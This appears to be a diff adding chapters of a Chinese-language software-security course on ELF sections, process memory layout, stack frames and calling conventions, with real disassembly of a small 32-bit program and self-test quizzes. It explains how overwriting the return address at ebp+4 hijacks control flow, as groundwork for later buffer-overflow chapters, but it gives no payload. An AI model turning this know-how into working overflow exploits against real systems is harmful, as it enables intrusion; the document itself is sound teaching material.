+        <tr><th>内容</th><th>文件偏移</th><th>映射后虚拟地址</th><th>验算</th></tr>
+        <tr><td>.text（代码）</td><td>0x310</td><td><code>0x8048310</code></td><td>0x8048000 + 0x310 ✓</td></tr>
+        <tr><td>.rodata（格式串所在节）</td><td>0x4e8</td><td><code>0x80484e8</code></td><td>0x8048000 + 0x4e8 ✓</td></tr>
+        <tr><td>格式串本身</td><td>0x4f0</td><td><code>0x80484f0</code></td><td>节首 +8，与 <code>push 0x80484f0</code> 一致 ✓</td></tr>
+      </table>
+    </div>
+    <p><a class="term" href="#g-vmem" data-term="g-vmem">虚拟内存</a>（Virtual Memory）：给每个进程一套独立、连续的地址空间，再由页表翻译到物理内存。类比：酒店房号——客人只认“1208 房”，具体在几楼哪张床由前台（页表）安排，换一间房不影响房号。三个直接作用：<strong>隔离</strong>（进程 A 写不到进程 B 的内存）、<strong>按需加载</strong>（没访问的页可以先不读盘）、<strong>共享</strong>（多进程共用同一份 libc 代码页，只读映射）。</p>
+
+    <h3>3.3.4 进程地址空间布局</h3>
+    <p>64 位 Linux 的典型布局（地址为示意，实际受 ASLR 影响；方向与相对位置是真实的）：</p>
+    <div class="mem-figure">
+      <div class="mem-stack">
+        <div class="mem-row"><div class="val">0xffff…</div><div class="lbl">内核空间（用户态不可访问）</div></div>
+        <div class="mem-row"><div class="val">0x7fff…</div><div class="lbl"><strong>用户栈</strong>：argc / argv / envp 在栈顶，向下增长 ↓</div></div>
+        <div class="mem-row mark"><div class="val">↓ ↑</div><div class="lbl">中间是 mmap 区：共享库（libc、ld）、大块 malloc、线程栈</div></div>
+        <div class="mem-row"><div class="val">↑</div><div class="lbl"><strong>堆 heap</strong>：brk/mmap 向上增长，malloc 从这里切块</div></div>
+        <div class="mem-row"><div class="val">.bss</div><div class="lbl">未初始化/零初始化的全局与静态变量（不占文件体积）</div></div>
+        <div class="mem-row"><div class="val">.data</div><div class="lbl">已初始化的全局与静态变量</div></div>
+        <div class="mem-row"><div class="val">.rodata</div><div class="lbl">字符串常量、只读表（如跳转表）</div></div>
+        <div class="mem-row"><div class="val">.text</div><div class="lbl">代码：只读 + 可执行，不可写</div></div>
+        <div class="mem-row"><div class="val">0x0 起</div><div class="lbl">低地址保留区（空指针解引用会立刻崩，属故意设计）</div></div>
+      </div>
+    </div>
+    <p class="mem-cap">图：64 位 Linux 进程布局（地址示意）。<strong>栈向低地址长、堆向高地址长，两者相向</strong>；共享库夹在中间，这也是“栈溢出能撞到哪儿”的空间前提。</p>
+    <p>课件给的 32 位布局则用真实边界：用户空间从 <code>0x08048000</code> 起，顶部是 <code>0xC0000000</code>。42 正是 32 位程序，它的代码就落在 <code>0x08048000</code> 之上那一片，格式串在 <code>0x80484f0</code>——能对上课件图上的位置。</p>
+    <p>课件还提到 <code>/proc/&lt;pid&gt;/maps</code>：运行中的进程可以把自己的映射表打印出来，每一行是“地址范围 + 权限 + 对应文件”。这是验证上面这张图最直接的办法。</p>
+
+    <h3>3.3.5 各节区的职责（对着 42 的真实尺寸看）</h3>
+    <div class="table-wrap">
+      <table>
+        <tr><th>节</th><th>42 中的地址 / 大小</th><th>装什么</th><th>权限</th><th>在文件里占空间？</th></tr>
+        <tr><td><code>.text</code></td><td>0x8048310 / 450 B</td><td>指令</td><td>R+X</td><td>是</td></tr>
+        <tr><td><code>.rodata</code></td><td>0x80484e8 / 30 B</td><td>字符串常量、只读表</td><td>R</td><td>是</td></tr>
+        <tr><td><code>.data</code></td><td>0x804a014 / 8 B</td><td>已初始化（非零）的全局/静态变量</td><td>R+W</td><td>是</td></tr>
+        <tr><td><code>.bss</code></td><td>0x804a01c / 4 B</td><td>未初始化或零初始化的全局/静态变量</td><td>R+W</td><td><strong>否</strong>（只记 memsz）</td></tr>
+        <tr><td><code>.plt</code></td><td>0x80482d0 / 48 B</td><td>外部函数的跳板（PLT0 + printf + __libc_start_main）</td><td>R+X</td><td>是</td></tr>
+        <tr><td><code>.got.plt</code></td><td>0x804a000 / 20 B</td><td>外部函数真实地址的槽位</td><td>R+W</td><td>是</td></tr>
+        <tr><td><code>.init_array</code> / <code>.fini_array</code></td><td>0x8049f08 / 4 B、0x8049f0c / 4 B</td><td>main 之前/之后要跑的构造器、析构器指针</td><td>R+W</td><td>是</td></tr>
+        <tr><td><code>.symtab</code> / <code>.strtab</code></td><td>文件偏移 0x1050 / 0x14b0</td><td>符号表与字符串表（调试用）</td><td>不映射</td><td>是，但<strong>运行时不加载</strong></td></tr>
+      </table>
+    </div>
+    <p><code>.bss</code> 为什么能“不占文件”？因为它全是 0：与其在文件里存一万个 0，不如只在节头里记一句“运行时给我留 1 万字节、全部清零”。加载时内核把这段内存按页清零（映射到零页或直接清零），文件体积就省下来了。42 里 memsz 比 filesz 多 4 字节，正是这个机制的体现。</p>
+    <p>42.c 本身只贡献了<strong>一个</strong>节：那句格式串进了 <code>.rodata</code>（42.o 里 22 字节）。它没有全局变量，所以 42.o 的 <code>.data</code> 与 <code>.bss</code> 都是 0 字节；42 里那 8 B 的 <code>.data</code> 和 4 B 的 <code>.bss</code> 来自 C 运行时（crt），不是你的代码。为了让“变量落在哪个节”有直观印象，下面这段是<strong>示意程序</strong>（课件未给同类例子）：</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">示意：不同变量落在不同节</span><span>C</span></div>
+      <pre data-lang="c">int g = 7;              /* .data：已初始化且非零，占文件 */
+int h;                  /* .bss ：未初始化，不占文件 */
+static int s;           /* .bss ：文件作用域，同上 */
+const char *msg = "hi"; /* 指针变量在 .data，"hi" 在 .rodata */
+void f(void) {
+    static int t;       /* .bss ：函数内静态变量也放这里 */
+    char buf[64];       /* 栈：局部数组，没有边界检查就是漏洞入口 */
+}</pre>
+    </div>
+
+    <h3>3.3.6 栈帧：call 那一刻到底发生了什么</h3>
+    <p>要避免的后果：如果函数调用不保存“回来时该执行哪条指令”，一个函数返回后就无处可去；如果局部变量没有固定位置，递归一次就会互相踩踏。<strong>栈</strong>用“后进先出”同时解决这两件事。</p>
+    <p><a class="term" href="#g-frame" data-term="g-frame">栈帧</a>（Stack Frame）：一次函数调用在栈上占用的那块区域，存放参数、<a class="term" href="#g-retaddr" data-term="g-retaddr">返回地址</a>（Return Address）和局部变量。类比：一张办公桌——你坐下时把桌面清出来（序言），走时把桌面恢复原样（结语），下一位同事接着用。</p>
+    <ul>
+      <li><code>call</code> 做两件事：把<strong>下一条指令的地址</strong>（返回地址）压栈，然后跳到被调用函数。此刻的 42：<code>main</code> 里 <code>0x8048453</code> 的 <code>call 0x804840b</code> 会把 <code>0x8048458</code> 压栈。</li>
+      <li><a class="term" href="#g-prologue" data-term="g-prologue">函数序言</a>（Prologue）：被调用函数开头三步——<code>push ebp</code>（保存调用者的帧指针）、<code>mov ebp,esp</code>（确立自己的帧基准）、<code>sub esp,N</code>（给自己的局部变量留空间）。</li>
+      <li><a class="term" href="#g-epilogue" data-term="g-epilogue">函数结语</a>（Epilogue）：<code>leave</code>（等价于 <code>mov esp,ebp; pop ebp</code>）恢复栈与帧指针，<code>ret</code> 弹出返回地址并跳回去。</li>
+    </ul>
+    <div class="code-block">
+      <div class="code-head"><span class="src">compile-42/42 · main 调用 answer 的真实指令（0x804840b 起）</span><span>ASM</span></div>
+      <pre data-lang="asm">; main 中的调用点（0x804844c）
+0804844c: 83ec08          sub  esp, 8
+0804844f: ff75f4          push dword [ebp-0xc]   ; 实参 x（值为 42）
+08048452: 50              push eax               ; 实参 argv[1]
+08048453: e8b3ffffff      call 0x804840b         ; 压入返回地址 0x8048458
+08048458: 83c410          add  esp, 0x10         ; 调用者清栈：8 字节参数
+
+; answer 本体（0x804840b）
+0804840b: 55              push ebp
+0804840c: 89e5            mov  ebp, esp
+0804840e: 83ec08          sub  esp, 8            ; 对齐
+08048411: 83ec04          sub  esp, 4
+08048414: ff750c          push dword [ebp+0xc]
+08048417: ff7508          push dword [ebp+0x8]
+0804841a: 68f0840408      push 0x80484f0         ; 格式串
+0804841f: e8bcfeffff      call 0x80482e0         ; printf@plt
+08048424: 83c410          add  esp, 0x10
+08048427: 90              nop
+08048428: c9              leave
+08048429: c3              ret</pre>
+    </div>
+    <div class="mem-figure">
+      <div class="mem-stack">
+        <div class="mem-row"><div class="val">高地址</div><div class="lbl">main 的栈帧 …</div></div>
+        <div class="mem-row"><div class="val">0xbffff4c0</div><div class="lbl">x（第 2 个参数，ebp+12）</div></div>
+        <div class="mem-row"><div class="val">0xbffff4bc</div><div class="lbl">name（第 1 个参数，ebp+8）</div></div>
+        <div class="mem-row mark"><div class="val">0xbffff4b8</div><div class="lbl">返回地址 0x8048458（ebp+4）← ret 把它弹进 EIP</div></div>
+        <div class="mem-row"><div class="val">0xbffff4b4</div><div class="lbl">保存的旧 ebp（ebp 指向这里）</div></div>
+        <div class="mem-row"><div class="val">0xbffff4b0</div><div class="lbl">（若有 char 数组）canary 占 ebp−4 起 4 字节（示意）</div></div>
+        <div class="mem-row"><div class="val">0xbffff4ac</div><div class="lbl">对齐填充 8 字节（ebp−8 起；answer 无局部变量）</div></div>
+        <div class="mem-row"><div class="val">0xbffff4a8</div><div class="lbl">%esp（ebp−12，sub 8 后再 sub 4）</div></div>
+      </div>
+    </div>
+    <p class="mem-cap">图：42 中 <code>answer</code> 的栈帧（地址为示意，以 answer 的 <code>ebp=0xbffff4b4</code> 为基准推出；帧内相对位置与真实汇编一致）。返回地址 <code>0x8048458</code> 是真实值。</p>
+    <p>这张图就是第 4 章的全部前提：<strong>返回地址就在局部变量数组的高地址侧不远处</strong>。<code>char buffer[100]</code> 若从 <code>ebp-112</code> 开始，往后写 112 字节正好压到 <code>ebp+4</code> 的返回地址——偏移 112 不是玄学，就是“数组起点到返回地址”的距离。</p>
+
+    <h3>3.3.7 ASLR / PIE / NX 先埋一句</h3>
+    <p>上面这张图在真实系统里还会被三件事改动，它们都在第 7 章详谈，这里只记住它们“改的是同一张图”：</p>
+    <ul>
+      <li><a class="term" href="#g-aslr" data-term="g-aslr">ASLR</a>：每次运行随机化栈、堆、共享库的基址，让你猜不准返回地址该填什么。</li>
+      <li><a class="term" href="#g-pie" data-term="g-pie">PIE</a>：可执行文件本身也能被装到任意基址（42 是固定 <code>0x08048000</code> 的老式非 PIE 程序）。</li>
+      <li><a class="term" href="#g-nx" data-term="g-nx">NX</a>：把栈与堆标成不可执行（42 的 RW 段 flags=6，没有执行位），注入的 shellcode 无法直接运行。</li>
+    </ul>
+
+    <h3>常见误解</h3>
+    <ul>
+      <li>「<code>.bss</code> 与 <code>.data</code> 是同一回事」——<code>.data</code> 存已初始化且非零的变量、占文件；<code>.bss</code> 存未初始化/零初始化变量、只占内存不占文件。</li>
+      <li>「静态链接的程序更小」——一般更大，因为它把库代码抄了进来；换来的是不依赖目标机的 libc 版本。</li>
+      <li>「<code>malloc</code> 的内存不在地址空间里」——它就是堆，而堆本身也是 mmap/brk 建立的映射，拿到的仍是虚拟地址。</li>
+      <li>「栈可以随便用」——默认只有 8 MB 量级（<code>ulimit -s</code>），这也是“大数组 + 深递归”会崩的原因。</li>
+      <li>「一个节就是一个段」——段是映射单位，一个段可含多个权限相同的节；42 的 30 个节只压成 2 个 LOAD 段。</li>
+      <li>「程序从 <code>main</code> 开始执行」——内核先跳到 <code>_start</code>（42 的 <code>0x8048310</code>），由 libc 初始化后才调用 <code>main</code>。</li>
+    </ul>
+
+    <div class="quiz">
+      <div class="quiz-title">自测 · 3.3 可执行文件与进程内存<span>4 题</span></div>
+
+      <div class="q" data-answer="B" data-explain=".bss 放未初始化或零初始化的全局/静态变量；它们全为 0，没有必要在文件里存，只需在程序头里用 memsz 记下内存需求，加载时清零。42 的 RW 段 filesz=0x114、memsz=0x118，差的 4 字节正是 .bss。">
+        <div class="q-stem"><span class="qno">1.</span>为什么 <code>.bss</code> 通常不占可执行文件的体积？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q3-5" value="A"><span>A. 因为它被压缩存储了</span></label>
+          <label class="opt"><input type="radio" name="q3-5" value="B"><span>B. 因为它全是 0，只需在段头记录所需内存大小，加载时清零</span></label>
+          <label class="opt"><input type="radio" name="q3-5" value="C"><span>C. 因为它被放在共享库里</span></label>
+          <label class="opt"><input type="radio" name="q3-5" value="D"><span>D. 因为它运行时才从磁盘读入</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="A" data-explain="readelf -S 读的是节区头表（链接视图，关心有哪些节、多大、在文件哪里）；readelf -l 读的是程序头表（执行视图，关心哪些段要映射、映射到哪个虚拟地址、什么权限）。">
+        <div class="q-stem"><span class="qno">2.</span><code>readelf -S</code> 与 <code>readelf -l</code> 分别在看什么？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q3-6" value="A"><span>A. 前者看节区头表（链接视图），后者看程序头表（执行视图）</span></label>
+          <label class="opt"><input type="radio" name="q3-6" value="B"><span>B. 前者看符号，后者看字符串</span></label>
+          <label class="opt"><input type="radio" name="q3-6" value="C"><span>C. 前者看 32 位，后者看 64 位</span></label>
+          <label class="opt"><input type="radio" name="q3-6" value="D"><span>D. 两者都只看代码段</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="C" data-explain="42 的 ELF 入口是 0x8048310，反汇编显示它就是 _start：它把 main 的地址 0x804842a 压栈后调用 __libc_start_main@plt（0x80482f0），由 libc 完成初始化再调用 main。">
+        <div class="q-stem"><span class="qno">3.</span>42 的入口地址 <code>0x8048310</code> 指向什么？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q3-7" value="A"><span>A. main 函数的第一条指令</span></label>
+          <label class="opt"><input type="radio" name="q3-7" value="B"><span>B. printf 的实现</span></label>
+          <label class="opt"><input type="radio" name="q3-7" value="C"><span>C. _start：把 main 地址交给 __libc_start_main 的启动代码</span></label>
+          <label class="opt"><input type="radio" name="q3-7" value="D"><span>D. .data 段的起始位置</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="B" data-explain="栈从高地址向低地址增长（push 使 esp 减小），堆从低地址向高地址增长。两者相向生长，中间隔着 mmap 区（共享库等），所以越界写栈是往高地址方向覆盖保存的 ebp 与返回地址。">
+        <div class="q-stem"><span class="qno">4.</span>关于栈与堆的增长方向，正确的是？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q3-8" value="A"><span>A. 栈向高地址增长，堆向低地址增长</span></label>
+          <label class="opt"><input type="radio" name="q3-8" value="B"><span>B. 栈向低地址增长，堆向高地址增长</span></label>
+          <label class="opt"><input type="radio" name="q3-8" value="C"><span>C. 两者都向高地址增长</span></label>
+          <label class="opt"><input type="radio" name="q3-8" value="D"><span>D. 两者都向低地址增长</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+    </div>
+    <p class="callout ok"><b>下一节要用到这里的什么</b>“返回地址位于 <code>ebp+4</code>”和“数组起点到返回地址有固定距离”，是第 4 章量出 108 / 112 的全部依据；而“栈不可执行”与“库地址随机化”，决定了溢出之后是跳 shellcode、跳 libc 还是拼 ROP。</p>
+
+
+    <h2>3.4 寄存器：EIP 为什么是关键</h2>
+    <p>x86 有 8 个通用寄存器：EAX、EBX、ECX、EDX、ESI、EDI、ESP（栈指针）、EBP（帧指针），外加 <strong>EIP</strong>（下一条指令地址）和 <strong>EFLAGS</strong>（条件码）。课件特别强调：<strong>没有直接获取或设置 EIP 的指令</strong>；EIP 只能由跳转、调用、返回等控制流指令间接改变。因此“劫持控制流”在机器层等价于“让 EIP 变成攻击者想要的值”，而最常见的手段就是改写栈上的返回地址，让 <code>ret</code> 把它弹进 EIP。</p>
+    <p>C 的 <code>if/while/for</code> 在汇编里落成“比较设置 EFLAGS + 条件跳转”。课件以 <code>if (x &lt;= y)</code> 为例，给出 <code>cmp 0xc(%ebp), %eax</code> 后接 <code>ja</code> 的写法（<code>cmp</code> 本质是做减法，但不写回结果）。</p>
+    <div class="table-wrap">
+      <table>
+        <tr><th>标志位</th><th>含义</th><th>用途</th></tr>
+        <tr><td>CF (bit 0)</td><td>最高有效位发生进位/借位则置 1</td><td>无符号溢出</td></tr>
+        <tr><td>ZF (bit 6)</td><td>结果为 0 则置 1</td><td>相等判断</td></tr>
+        <tr><td>PF (bit 2)</td><td>结果最低有效字节含偶数个 1 则置 1</td><td>奇偶校验</td></tr>
+        <tr><td>OF (bit 11)</td><td>有符号结果无法用目标宽度表示则置 1</td><td>有符号溢出</td></tr>
+        <tr><td>SF (bit 7)</td><td>结果为负则置 1</td><td>符号判断</td></tr>
+      </table>
+    </div>
+    <p>常见条件跳转：<code>JA</code>（CF=0 且 ZF=0）、<code>JZ/JE</code>（ZF=1）、<code>JL</code>（SF≠OF）、<code>JLE</code>（ZF=1 或 SF≠OF）、<code>JB</code>（CF=1）、<code>JO</code>（OF=1）。<strong>有符号与无符号用不同跳转指令</strong>，这就是第 5 章整数溢出能绕过长度检查的原因之一。</p>
+
+    <h2>3.5 调用约定 cdecl 与栈帧</h2>
+    <p>上一节的图已经画出栈帧的形状，但还剩一个问题：<strong>参数凭什么放在 <code>ebp+8</code></strong>？这不是硬件规定，而是人为约定。本节把这条约定讲透，目标是读完能对着一段汇编反推出 C 代码。</p>
+
+    <h3>3.5.1 没有约定会怎样</h3>
+    <p><a class="term" href="#g-cdecl" data-term="g-cdecl">调用约定</a>（Calling Convention）：函数双方对“参数放哪、谁清栈、返回值放哪、寄存器谁保存”的统一约定。类比：两个人合伙搬家具，必须先说好“谁抬哪一头、进门谁先松手”，否则一定砸脚。</p>
+    <p>要避免的后果很具体：你在 <code>a.c</code> 里用编译器 A 编出一个函数，别人在 <code>b.c</code> 里用编译器 B 调用它。若 A 认为参数走寄存器、B 认为参数在栈上，双方各自都“编译通过”，一连起来就取到垃圾值、返回时 <code>esp</code> 错位、栈一路崩到底。<strong>源码互相看不见，唯一能对齐的就是约定</strong>——这也是为什么调用约定属于 ABI，而不是某个编译器的小技巧。</p>
+
+    <h3>3.5.2 cdecl 的五条规则</h3>
+    <ol>
+      <li><strong>参数从右向左压栈</strong>。所以最先 push 的是最后一个实参，最后 push 的是第一个实参；进入函数后，第一个参数永远在 <code>ebp+8</code>。</li>
+      <li><strong>调用者清理栈</strong>。参数是调用者压的，返回后由调用者 <code>add esp,N</code> 收回（<code>ret</code> 只负责弹返回地址）。</li>
+      <li><strong>返回值放 eax</strong>（64 位整型或指针放 <code>rax</code>；更大的结构体改用隐藏指针）。</li>
+      <li><strong>callee-saved（被调用者保存）</strong>：<code>ebx、esi、edi、ebp</code>。被调用函数若用到它们，必须自己先 push、返回前恢复。</li>
+      <li><strong>caller-saved（调用者保存）</strong>：<code>eax、ecx、edx</code>。调用返回后它们可能已被改写，调用者若要继续用，必须自己提前存好。</li>
+    </ol>
+    <p>为什么“从右到左”？两个直接原因：① 第一个参数的位置因此<strong>固定</strong>在 <code>ebp+8</code>，编译器不必知道总共有几个参数就能取到它；② 可变参数函数（如 <code>printf</code>）正是靠这个固定起点，从 <code>ebp+8</code> 起按顺序往高地址读——格式串在前，后续参数依次排在高地址。若从左到右压栈，参数个数一变，第一个参数的位置就跟着变。</p>
+    <p>为什么“调用者清栈”？因为只有调用者知道自己实际传了几个参数。被调用者若用 <code>ret N</code> 清栈（stdcall 的做法），就无法支持可变参数。</p>
+
+    <h3>3.5.3 逐条演示：42 的 main 调用 answer</h3>
+    <p>用 3.3.6 那段真实汇编，把每条指令对 <code>esp</code> 与栈内容的影响列出来。地址为示意（以 <code>answer</code> 的 <code>ebp=0xbffff4b4</code> 为基准），指令与字节是真实值。</p>
+    <div class="table-wrap">
+      <table class="step-table">
+        <tr><th>#</th><th>指令（真实）</th><th>esp 变化</th><th>此刻栈里是什么（栈顶在下）</th></tr>
+        <tr><td>0</td><td>—</td><td>0xbffff4cc</td><td>main 的局部区与旧帧，尚无参数</td></tr>
+        <tr><td>1</td><td><code>sub esp, 8</code></td><td>→ 0xbffff4c4</td><td>腾出 8 字节，给两个实参预留位置（尚未写入）</td></tr>
+        <tr><td>2</td><td><code>push [ebp-0xc]</code></td><td>→ 0xbffff4c0</td><td>写入 <code>42</code>：第 2 个实参 <strong>x</strong>，先压</td></tr>
+        <tr><td>3</td><td><code>push eax</code></td><td>→ 0xbffff4bc</td><td>写入 <code>argv[1]</code> 的地址：第 1 个实参 <strong>name</strong>，后压</td></tr>
+        <tr><td>4</td><td><code>call 0x804840b</code></td><td>→ 0xbffff4b8</td><td>压入返回地址 <code>0x8048458</code>（下一条指令）</td></tr>
+        <tr><td>5</td><td><code>push ebp</code></td><td>→ 0xbffff4b4</td><td>压入 main 的旧 ebp（值 0xbffff4cc）</td></tr>
+        <tr><td>6</td><td><code>mov ebp, esp</code></td><td>不变（ebp=0xbffff4b4）</td><td>ebp 定在新帧基准；<code>ebp+8</code> 正好是 name</td></tr>
+        <tr><td>7</td><td><code>sub esp, 8</code></td><td>→ 0xbffff4ac</td><td>对齐（answer 没有局部变量）</td></tr>
+        <tr><td>8</td><td><code>sub esp, 4</code></td><td>→ 0xbffff4a8</td><td>再对齐；此刻帧内最低点</td></tr>
+        <tr><td>9</td><td><code>leave</code></td><td>→ 0xbffff4b8</td><td>先 <code>mov esp,ebp</code> 收回局部区，再弹出旧 ebp</td></tr>
+        <tr><td>10</td><td><code>ret</code></td><td>→ 0xbffff4bc</td><td>弹出 <code>0x8048458</code> 到 EIP，控制权回到 main</td></tr>
+        <tr><td>11</td><td><code>add esp, 0x10</code></td><td>→ 0xbffff4cc</td><td>调用者清掉参数区，esp 与第 0 步完全一致</td></tr>
+      </table>
+    </div>
+    <p>把第 11 步与第 0 步对照：<strong>esp 回到了原值</strong>。这是“调用前后栈平衡”最直观的检验——若某段汇编里 <code>add esp</code> 清掉的字节数与 push 的字节数对不上，栈就会越跑越偏，迟早崩。<code>answer</code> 内部再调用 <code>printf</code> 时，第 2–4 步会原样重复（3 个参数 12 字节，随后 <code>add esp,0x10</code> 多清 4 字节对齐）。</p>
+
+    <h3>3.5.4 与其他约定对照（别把 32 位与 64 位混着背）</h3>
+    <div class="table-wrap">
+      <table>
+        <tr><th>约定</th><th>参数怎么传</th><th>谁清栈</th><th>返回值</th><th>典型场景</th></tr>
+        <tr><td><strong>cdecl</strong></td><td>栈，右→左；首参数在 <code>ebp+8</code></td><td><strong>调用者</strong> <code>add esp,N</code></td><td>eax</td><td>Linux 32 位 GCC 默认；本课程实验全部用它</td></tr>
+        <tr><td>stdcall</td><td>栈，右→左</td><td><strong>被调用者</strong> <code>ret N</code></td><td>eax</td><td>Windows API（Win32）</td></tr>
+        <tr><td>fastcall</td><td>前 2 个走 ecx/edx，其余入栈</td><td>被调用者</td><td>eax</td><td>追求速度的 32 位代码</td></tr>
+        <tr><td>thiscall</td><td><code>this</code> 走 ecx（GCC 则压栈），其余入栈</td><td>MSVC 由被调用者清</td><td>eax</td><td>C++ 成员函数</td></tr>
+        <tr><td><strong>SysV AMD64</strong></td><td>整数/指针依次走 <code>rdi、rsi、rdx、rcx、r8、r9</code>；浮点走 <code>xmm0–7</code>；超出部分入栈</td><td>调用者</td><td><code>rax</code>（128 位 <code>rdx:rax</code>）</td><td><strong>现代 Linux 64 位默认</strong></td></tr>
+        <tr><td>Microsoft x64</td><td>依次走 <code>rcx、rdx、r8、r9</code>；其余入栈</td><td>调用者</td><td><code>rax</code></td><td>Windows 64 位；调用前须留 32 字节 shadow space</td></tr>
+      </table>
+    </div>
+    <ul>
+      <li><strong>SysV AMD64 的栈对齐</strong>：执行 <code>call</code> 时 <code>rsp</code> 必须是 16 的倍数（即进入函数时 <code>rsp+8</code> 对齐到 16）。不对齐时，用到 <code>movaps</code>/<code>movdqa</code> 的代码会直接崩——64 位上最常见的一类“莫名其妙”崩溃。</li>
+      <li><strong>red zone</strong>：SysV 允许叶子函数使用 <code>rsp</code> 以下 128 字节而不必先调整 <code>rsp</code>（信号处理程序不会踩它）；32 位没有这个待遇。</li>
+      <li><strong>varargs 与 MS x64</strong>：调用可变参数函数时，<code>al</code> 要放“向量寄存器里传了几个浮点参数”，否则被调用者不知道要不要保存 <code>xmm</code>。</li>
+      <li><strong>别混用</strong>：本课程实验是 32 位 x86 + cdecl（<code>ebp</code>、<code>eax</code>、栈传参）；现代 Linux 默认是 SysV AMD64（<code>rbp</code>、<code>rax</code>、寄存器传参）。论文与 exp 里两套寄存器名不要互相套用。</li>
+    </ul>
+
+    <h3>3.5.5 栈帧全图与 prologue / epilogue 的位置变化</h3>
+    <div class="mem-figure">
+      <div class="mem-stack">
+        <div class="mem-row"><div class="val">高地址 ↑</div><div class="lbl">调用者的栈帧（main 的局部变量等）</div></div>
+        <div class="mem-row"><div class="val">0xbffff4c0</div><div class="lbl">参数区：第 2 个实参 x = 42（<code>ebp+12</code>）</div></div>
+        <div class="mem-row"><div class="val">0xbffff4bc</div><div class="lbl">参数区：第 1 个实参 name（<code>ebp+8</code>）</div></div>
+        <div class="mem-row mark"><div class="val">0xbffff4b8</div><div class="lbl"><strong>返回地址</strong> 0x8048458（<code>ebp+4</code>）← 攻击目标</div></div>
+        <div class="mem-row"><div class="val">0xbffff4b4</div><div class="lbl">保存的旧 ebp（<strong>ebp 指这里</strong>）</div></div>
+        <div class="mem-row"><div class="val">0xbffff4b0</div><div class="lbl">canary（仅当函数有数组等易被溢出的对象时插入，示意）</div></div>
+        <div class="mem-row"><div class="val">0xbffff4ac</div><div class="lbl">局部变量 / 对齐填充（本例为空，仅对齐 8 字节）</div></div>
+        <div class="mem-row"><div class="val">0xbffff4a8</div><div class="lbl"><strong>esp</strong>（帧内最低点；push 会让它继续向低地址走）</div></div>
+        <div class="mem-row"><div class="val">低地址 ↓</div><div class="lbl">更深调用时，下一层栈帧从这里往下长</div></div>
+      </div>
+    </div>
+    <p class="mem-cap">图：cdecl 栈帧全图（地址示意，与 3.5.3 表格一致）。<strong>数组越界往高地址写，先撞 canary，再撞旧 ebp，最后撞返回地址</strong>——顺序由这张图决定，也是第 4 章所有偏移的来源。</p>
+    <div class="table-wrap">
+      <table class="step-table">
+        <tr><th>阶段</th><th>指令</th><th>esp</th><th>ebp</th></tr>
+        <tr><td>call 之后</td><td>（call 已压返回地址）</td><td>0xbffff4b8</td><td>仍为 main 的 0xbffff4cc</td></tr>
+        <tr><td>prologue ①</td><td><code>push ebp</code></td><td>0xbffff4b4</td><td>0xbffff4cc（未变）</td></tr>
+        <tr><td>prologue ②</td><td><code>mov ebp, esp</code></td><td>0xbffff4b4</td><td><strong>0xbffff4b4</strong>（新基准）</td></tr>
+        <tr><td>prologue ③</td><td><code>sub esp, 8</code> + <code>sub esp, 4</code></td><td><strong>0xbffff4a8</strong></td><td>0xbffff4b4</td></tr>
+        <tr><td>epilogue ①</td><td><code>leave</code>（mov esp,ebp + pop ebp）</td><td>0xbffff4b8</td><td>0xbffff4cc（恢复成 main 的）</td></tr>
+        <tr><td>epilogue ②</td><td><code>ret</code></td><td>0xbffff4bc</td><td>不变</td></tr>
+      </table>
+    </div>
+    <p>还想看一份“只为观察序言/结语”的干净材料，可以打开素材里的 <a href="src/pro_epi_logue.c">pro_epi_logue.c</a>（15 行，三个空函数互相调用），配合 <code>gcc -S</code> 生成的 <code>pro_epi_logue.s</code> 逐个函数对照。</p>
+    <p><strong>函数序言</strong>（prologue）做三件事：保存旧 ebp、确立新 ebp、把 esp 下移给局部变量（<code>push ebp / mov ebp,esp / sub esp,N</code>）；<strong>函数结语</strong>（epilogue）做两件事：把返回值放进 eax，再用 <code>leave</code> 收回栈、<code>ret</code> 弹回控制权。下面这份材料正好只有这两组动作：</p>
+
+    <div class="code-block">
+      <div class="code-head"><span class="src">returntolibc/pro_epi_logue.c · 第 1–15 行（用 gcc -S 观察序言/结语）</span><span>C</span></div>
+      <pre data-lang="c">void foo(int x){
+	int a;
+	a = x;
+}
+
+void bar(){
+	int b = 5;
+	foo(b);
+}
+
+int main(){
+	foo(2);
+	bar(3);
+	return 0;
+}</pre>
+    </div>
+    <p>这份代码本身不执行业务逻辑，用途就是对照 <code>pro_epi_logue.s</code> 看每个函数的 <code>push ebp / mov ebp,esp / leave / ret</code>。看完再回到上面那张表：每一步的 <code>esp</code> 变化，在真实编译产物里都能一一对上。</p>
+
+    <h3>3.5.6 反向练习：看汇编反推 C</h3>
+    <p>下面这段是<strong>示意</strong>汇编（不是 42 的产物，用来练手），规则与本节完全一致：</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">示意：一段未知函数的汇编</span><span>ASM</span></div>
+      <pre data-lang="asm">f:
+    push ebp
+    mov  ebp, esp
+    sub  esp, 0x18
+    mov  eax, [ebp+0xc]    ; 取第 2 个参数 b
+    imul eax, [ebp+0x10]   ; b * c
+    add  eax, [ebp+8]      ; a + b*c
+    mov  [ebp-4], eax      ; 存到局部变量
+    mov  eax, [ebp-4]      ; 再取回，作为返回值
+    leave
+    ret</pre>
+    </div>
